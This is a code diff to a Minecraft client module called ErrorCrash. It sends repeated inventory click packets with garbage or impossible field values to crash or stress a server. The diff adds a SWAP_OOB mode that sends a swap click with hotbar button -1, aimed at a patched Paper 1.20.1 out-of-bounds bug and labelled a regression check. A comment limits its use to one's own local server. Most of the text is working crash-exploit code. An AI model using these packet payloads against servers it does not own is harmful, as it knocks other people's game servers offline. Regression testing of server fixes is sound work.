@@ -38,13 +38,13 @@ import net.minecraft.screen.sync.ItemStackHash;
  * Requires an open container. Run against your OWN local server only.
  */
 public class ErrorCrash extends Module {
-    public enum Mode { MALFORMED, IMPOSSIBLE_COMBO }
+    public enum Mode { MALFORMED, IMPOSSIBLE_COMBO, SWAP_OOB }
 
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
     private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
         .name("mode")
-        .description("MALFORMED = every field garbage (slot 2957234 / button 99 / stale rev). IMPOSSIBLE_COMBO = each field individually valid, but in an impossible combination.")
+        .description("MALFORMED = every field garbage (slot 2957234 / button 99 / stale rev). IMPOSSIBLE_COMBO = each field individually valid, but in an impossible combination. SWAP_OOB = a SWAP click with an out-of-range hotbar button (-1) — the former window-crash, targeting the patched Paper 1.20.1 SWAP-handler AIOOBE (regression check).")
         .defaultValue(Mode.MALFORMED).build()
     );
     private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
@@ -75,7 +75,7 @@ public class ErrorCrash extends Module {
     @Override
     public void onActivate() {
         ticksActive = 0; packetsSent = 0;
-        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
+        cadence.onActivate(); gr.onActivate(this); preStress.onActivate(this);
     }
 
     @EventHandler
@@ -87,14 +87,18 @@ public class ErrorCrash extends Module {
         var handler = mc.player.currentScreenHandler;
         int syncId = handler.syncId;
         for (int i = 0; i < amount.get(); i++) {
-            ClickSlotC2SPacket pkt = mode.get() == Mode.MALFORMED
+            ClickSlotC2SPacket pkt = switch (mode.get()) {
                 // every field garbage
-                ? new ClickSlotC2SPacket(syncId, 123344, (short) 2957234, (byte) 99,
-                    SlotActionType.PICKUP, new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY)
+                case MALFORMED -> new ClickSlotC2SPacket(syncId, 123344, (short) 2957234, (byte) 99,
+                    SlotActionType.PICKUP, new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY);
                 // valid syncId, valid revision, valid slot 0 — but QUICK_CRAFT with a
                 // PICKUP-style button code is an action/button pairing that cannot occur
-                : new ClickSlotC2SPacket(syncId, handler.getRevision(), (short) 0, (byte) 99,
+                case IMPOSSIBLE_COMBO -> new ClickSlotC2SPacket(syncId, handler.getRevision(), (short) 0, (byte) 99,
                     SlotActionType.QUICK_CRAFT, new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY);
+                // SWAP with an out-of-range hotbar button (-1) — folded from window-crash
+                case SWAP_OOB -> new ClickSlotC2SPacket(syncId, handler.getRevision(), (short) 36, (byte) -1,
+                    SlotActionType.SWAP, new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY);
+            };
             mc.player.networkHandler.sendPacket(pkt);
             packetsSent++;
         }
